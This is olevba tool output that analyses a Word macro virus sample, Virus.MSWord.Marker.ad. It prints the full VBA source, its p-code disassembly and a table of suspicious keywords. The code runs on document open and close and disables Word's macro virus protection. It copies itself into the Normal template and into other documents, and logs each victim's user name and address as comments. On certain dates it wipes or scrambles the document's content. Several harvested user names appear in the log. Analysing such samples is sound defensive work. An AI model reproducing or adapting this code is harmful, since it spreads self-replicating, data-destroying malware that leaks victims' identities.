olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ad
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ad - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    
    Options.VirusProtection = True
    Options.SaveNormalPrompt = True
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim ad, nt As Object
    
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next I

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
            nt.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

            ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
            ad.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub

Private Sub Document_Open()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim ad, nt As Object
    
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next I

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
            nt.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

            ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
            ad.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub


' 05:58:46 PM - Sunday, 11 Apr 1999
' USER19
'



' 04:17:17 PM - Thursday, 27 May 1999
' AA
'



' 12:25:42 PM - Wednesday, 9 Jun 1999
' TOM GEORGE
'



' 02:46:30 PM - Sunday, 13 Jun 1999
' Milind Bhavsar
'



' 12:45:02 PM - Saturday, 19 Jun 1999
' GOUTAM
'



' 04:58:03 AM - Wednesday, 28 Jul 1999
' TEST
'



' 10:13:03 AM - Saturday, 21 Aug 1999
' Administrator
'



' 12:15:58 PM - Friday, 18 Sep 1998
' cms
'


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.ad
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10154 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x001A "<- this is another marker!"
' 	VarDefn OldMarker
' Line #5:
' 	Dim (Const) 
' 	LitStr 0x0009 "WebMaster"
' 	VarDefn Marker
' Line #6:
' Line #7:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #9:
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #12:
' Line #13:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #14:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #15:
' Line #16:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #17:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #18:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #19:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #20:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #21:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #22:
' 	LitStr 0x0008 "Webdings"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #23:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	QuoteRem 0x0004 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #27:
' 	LineCont 0x0008 0B 00 08 00 12 00 08 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #28:
' Line #29:
' Line #30:
' 	QuoteRem 0x0008 0x0019 "Infect the NormalTemplate"
' Line #31:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #32:
' Line #33:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #34:
' Line #35:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #36:
' Line #37:
' 	QuoteRem 0x000C 0x0031 "Write a log file of this NormalTemplate infection"
' Line #38:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #39:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #40:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #41:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	ElseBlock 
' Line #44:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' Line #48:
' 	LineCont 0x0010 09 00 16 00 12 00 16 00 1E 00 16 00 29 00 16 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #49:
' Line #50:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #52:
' Line #53:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #54:
' Line #55:
' 	EndIfBlock 
' Line #56:
' Line #57:
' Line #58:
' 	QuoteRem 0x0008 0x0019 "Infect the ActiveDocument"
' Line #59:
' 	LineCont 0x0008 05 00 0C 00 13 00 0D 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #60:
' Line #61:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #62:
' Line #63:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #64:
' Line #65:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #66:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #67:
' Line #68:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #69:
' Line #70:
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	EndSub 
' Line #74:
' Line #75:
' 	FuncDefn (Private Sub Document_Open())
' Line #76:
' Line #77:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #78:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #79:
' Line #80:
' 	Dim (Const) 
' 	LitStr 0x001A "<- this is another marker!"
' 	VarDefn OldMarker
' Line #81:
' 	Dim (Const) 
' 	LitStr 0x0009 "WebMaster"
' 	VarDefn Marker
' Line #82:
' Line #83:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #84:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #85:
' Line #86:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #87:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #88:
' Line #89:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #90:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #91:
' Line #92:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #93:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #94:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #95:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #96:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #97:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #98:
' 	LitStr 0x0008 "Webdings"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #99:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #100:
' 	EndIfBlock 
' Line #101:
' Line #102:
' 	QuoteRem 0x0004 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #103:
' 	LineCont 0x0008 0B 00 08 00 12 00 08 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #104:
' Line #105:
' Line #106:
' 	QuoteRem 0x0008 0x0019 "Infect the NormalTemplate"
' Line #107:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #108:
' Line #109:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #110:
' Line #111:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #112:
' Line #113:
' 	QuoteRem 0x000C 0x0031 "Write a log file of this NormalTemplate infection"
' Line #114:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #115:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #116:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #117:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	ElseBlock 
' Line #120:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #121:
' 	EndIfBlock 
' Line #122:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #123:
' Line #124:
' 	LineCont 0x0010 09 00 16 00 12 00 16 00 1E 00 16 00 29 00 16 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #125:
' Line #126:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #127:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #128:
' Line #129:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #130:
' Line #131:
' 	EndIfBlock 
' Line #132:
' Line #133:
' Line #134:
' 	QuoteRem 0x0008 0x0019 "Infect the ActiveDocument"
' Line #135:
' 	LineCont 0x0008 05 00 0C 00 13 00 0D 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #136:
' Line #137:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #138:
' Line #139:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #140:
' Line #141:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #142:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #143:
' Line #144:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #145:
' Line #146:
' 	EndIfBlock 
' Line #147:
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	EndSub 
' Line #150:
' Line #151:
' Line #152:
' 	QuoteRem 0x0000 0x0022 " 05:58:46 PM - Sunday, 11 Apr 1999"
' Line #153:
' 	QuoteRem 0x0000 0x0007 " USER19"
' Line #154:
' 	QuoteRem 0x0000 0x0000 ""
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' 	QuoteRem 0x0000 0x0024 " 04:17:17 PM - Thursday, 27 May 1999"
' Line #159:
' 	QuoteRem 0x0000 0x0003 " AA"
' Line #160:
' 	QuoteRem 0x0000 0x0000 ""
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' 	QuoteRem 0x0000 0x0024 " 12:25:42 PM - Wednesday, 9 Jun 1999"
' Line #165:
' 	QuoteRem 0x0000 0x000B " TOM GEORGE"
' Line #166:
' 	QuoteRem 0x0000 0x0000 ""
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' 	QuoteRem 0x0000 0x0022 " 02:46:30 PM - Sunday, 13 Jun 1999"
' Line #171:
' 	QuoteRem 0x0000 0x000F " Milind Bhavsar"
' Line #172:
' 	QuoteRem 0x0000 0x0000 ""
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' 	QuoteRem 0x0000 0x0024 " 12:45:02 PM - Saturday, 19 Jun 1999"
' Line #177:
' 	QuoteRem 0x0000 0x0007 " GOUTAM"
' Line #178:
' 	QuoteRem 0x0000 0x0000 ""
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' 	QuoteRem 0x0000 0x0025 " 04:58:03 AM - Wednesday, 28 Jul 1999"
' Line #183:
' 	QuoteRem 0x0000 0x0005 " TEST"
' Line #184:
' 	QuoteRem 0x0000 0x0000 ""
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' 	QuoteRem 0x0000 0x0024 " 10:13:03 AM - Saturday, 21 Aug 1999"
' Line #189:
' 	QuoteRem 0x0000 0x000E " Administrator"
' Line #190:
' 	QuoteRem 0x0000 0x0000 ""
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' 	QuoteRem 0x0000 0x0022 " 12:15:58 PM - Friday, 18 Sep 1998"
' Line #195:
' 	QuoteRem 0x0000 0x0004 " cms"
' Line #196:
' 	QuoteRem 0x0000 0x0000 ""
' Line #197:
' Line #198:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

